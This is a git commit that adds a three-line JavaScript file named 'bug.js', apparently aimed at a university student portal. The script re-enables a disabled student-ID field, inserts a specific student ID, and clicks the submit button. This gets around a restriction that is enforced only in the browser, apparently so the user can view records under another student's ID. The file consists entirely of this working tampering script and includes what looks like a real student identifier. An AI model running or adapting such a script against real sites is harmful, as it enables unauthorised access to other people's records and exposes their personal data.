2e52c11f40ab23cb025d15a33a58277dfaf47b77
Md Robiuddin Robi <mrobiuddin171023@bscse.uiu.ac.bd>
2020-01-17 22:02:42 +0600

    Create bug.js

---
+++ bug.js
@@ -0,0 +1,3 @@
+document.getElementById("ctl00_MainContainer_txtStudentID").disabled = false;
+document.getElementById("ctl00_MainContainer_txtStudentID").value = "011181085";
+document.getElementById("ctl00_MainContainer_Button1").click();
